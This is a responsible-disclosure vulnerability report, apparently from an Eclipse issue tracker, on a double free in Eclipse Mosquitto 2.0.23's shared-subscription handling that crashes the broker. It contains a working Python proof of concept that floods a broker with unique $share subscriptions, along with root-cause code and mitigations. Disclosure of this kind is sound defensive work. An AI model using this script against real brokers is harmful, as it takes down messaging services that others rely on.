# Eclipse Mosquitto 2.0.23 Shared Subscription Double Free Leading to Remote Denial of Service

<!--
Note that this issue is configured (see the quick actions at the bottom) to be created as confidential.

Note that a vulnerability does not need to actually be resolved before it is reported and that these reports can be revised as needed (reopen the issue to request changes).

If you do not know how to fill certain fields, mark that in the comment and we will help you.

You can delete the comments (or not).
-->

<!--
Required. Specify the project's name (e.g., "Eclipse Dash") and Eclipse Foundation ID, e.g., "technology.dash".
-->

## Basic information

**Project name:** Eclipse Mosquitto

**Project id:** iot.mosquitto

## What are the affected versions?

Confirmed on the current workspace build: `2.0.23`.

I have not yet bisected the introduction point, so I cannot give an exact lower bound. Based on the affected code path, versions containing this shared-subscription implementation in `src/subs.c` are likely affected.

## Details of the issue

**CWE:** `CWE-415 (Double Free)`

A remotely triggerable memory corruption issue exists in the broker shared-subscription handling path. When processing repeated MQTT `SUBSCRIBE` packets for unique shared subscriptions such as `$share/<group>/<topic>`, the broker can reach an allocation-failure rollback path in `sub__add_shared()` and free the same `newleaf` object twice.

The issue is in the rollback logic in `src/subs.c:256-257`. `sub__remove_shared_leaf()` already frees `leaf` in `src/subs.c:190`, but `sub__add_shared()` calls `mosquitto__free(newleaf)` again immediately afterwards.

Relevant code path:

- `src/handle_subscribe.c:199`
- `src/subs.c:190`
- `src/subs.c:202`
- `src/subs.c:256-257`

Impact:

- Remote unauthenticated or low-privileged DoS, depending on broker exposure and ACLs.
- Triggerable using only MQTT protocol traffic.
- With ASan enabled, this reproduces as an invalid free / double free abort.
- Without ASan, this is still a real memory-safety bug and can crash the broker once the allocation-failure path is reached.

## Steps to reproduce

I confirmed this on the current workspace build of Mosquitto `2.0.23`.

Theoretical minimum local reproduction configuration:

```conf
memory_limit 5000000
```

`memory_limit` is not required for the bug to exist. It is only used here to make the allocation-failure rollback path easier to reach and the crash easier to reproduce reliably. Without `memory_limit`, the bug still exists and can still be triggered if the relevant allocation fails due to normal memory pressure, process limits, container limits, or allocator behavior.

The reason the minimal local configuration can be this small is that the affected version defaults to local-only mode and automatically listens on the loopback interface on port 1883; `persistence` is also disabled by default.

For clarity and portability across different test environments, this report uses the following explicit configuration example:

```conf
listener 18883
allow_anonymous true
persistence false
memory_limit 5000000
```

`allow_anonymous true` is also not a vulnerability prerequisite. It is only used here to simplify the PoC. An authenticated client with permission to create shared subscriptions can also trigger the issue.

1. Build/run the broker with ASan enabled.
2. Start the broker:

```bash
./src/mosquitto -c <config-file> -v
```

3. Send one valid MQTT 3.1.1 `CONNECT`, then repeatedly send unique shared-subscription `SUBSCRIBE` packets. Example Python PoC:

```python
#!/usr/bin/env python3
import socket
import struct
import sys


def encode_varint(value: int) -> bytes:
    out = bytearray()
    while True:
        byte = value % 128
        value //= 128
        if value:
            byte |= 0x80
        out.append(byte)
        if not value:
            return bytes(out)


def recv_exact(sock: socket.socket, size: int) -> bytes:
    data = bytearray()
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            raise ConnectionError("peer closed")
        data.extend(chunk)
    return bytes(data)


def recv_packet(sock: socket.socket) -> bytes:
    first = recv_exact(sock, 1)
    remaining = 0
    multiplier = 1
    encoded = bytearray()
    while True:
        byte = recv_exact(sock, 1)[0]
        encoded.append(byte)
        remaining += (byte & 0x7F) * multiplier
        if (byte & 0x80) == 0:
            break
        multiplier *= 128
    payload = recv_exact(sock, remaining)
    return first + bytes(encoded) + payload


def make_connect(client_id: bytes) -> bytes:
    variable_header = struct.pack("!H4sBBH", 4, b"MQTT", 4, 0x02, 60)
    payload = struct.pack("!H", len(client_id)) + client_id
    body = variable_header + payload
    return b"\x10" + encode_varint(len(body)) + body


def make_subscribe(mid: int, topic: bytes) -> bytes:
    body = (
        struct.pack("!H", mid)
        + struct.pack("!H", len(topic))
        + topic
        + b"\x00"
    )
    return b"\x82" + encode_varint(len(body)) + body


sock = socket.create_connection(("127.0.0.1", 18883))
sock.sendall(make_connect(b"poc"))
print(recv_packet(sock).hex())

i = 0
while True:
    i += 1
    topic = f"$share/g{i}/t{i}".encode()
    sock.sendall(make_subscribe(i & 0xFFFF, topic))
    recv_packet(sock)
    if i % 500 == 0:
        print("sent", i)
        sys.stdout.flush()
```

4. On my test run, the broker aborted after several thousand subscriptions with ASan output showing the invalid free in `sub__add_shared()`:

![image-20260317215523593](C:\Users\Administrator\Desktop\RuoyuZhou\bug_reports\assets\image-20260317215523593.png)

Root cause in code:

```c
if(!subs){
    sub__remove_shared_leaf(subhier, shared, newleaf);
    mosquitto__free(newleaf);
    mosquitto__free(csub);
    return MOSQ_ERR_NOMEM;
}
```

But `sub__remove_shared_leaf()` already does:

```c
mosquitto__free(leaf);
```

## Do you know any mitigations of the issue?

Possible mitigations until patched:

- Prevent untrusted clients from using shared subscriptions.
- Use ACLs to deny subscriptions matching `$share/#` or other shared-subscription filters for clients that do not need this feature.
- Restrict anonymous access or require authentication.
- Avoid unusually small `memory_limit` settings if possible, because they make the failure path easier to hit during testing, though they are not the root cause.
- More generally, do not expose the broker to untrusted MQTT clients if shared subscriptions are not required.

I do not currently know of a dedicated configuration option that fully disables shared subscriptions globally in this build.

<!--
  Please, do not remove the line below. It will create a confidential issue that will be visible
  only to you and the members of this project. Confidential issues are used to keep security
  vulnerabilities private until they are sorted out.
  Eclipse Projects follow Responsible Disclosure best practices: the initial report is made privately,
  but with the full details being published once a patch has been made available (sometimes with
  a delay to allow more time for the patches to be installed).
-->

/confidential
